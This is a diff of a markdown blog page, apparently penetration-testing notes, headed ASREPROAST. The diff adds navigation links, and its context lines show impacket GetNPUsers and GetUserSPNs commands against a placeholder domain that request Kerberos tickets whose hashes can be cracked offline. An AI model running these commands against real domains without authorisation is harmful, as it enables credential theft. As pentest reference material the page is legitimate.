@@ -1,3 +1,5 @@
+[back to blog](../blog.md)
+
 # ASREPROAST
 
 ```
@@ -9,3 +11,5 @@ impacket-GetNPUsers test.com/user:'Password!' -usersfile domainusers.txt -format
 ```
 impacket-GetUserSPNs test.com/test:'Password!' -dc-ip IP -request
 ```
+
+[back to blog](../blog.md)
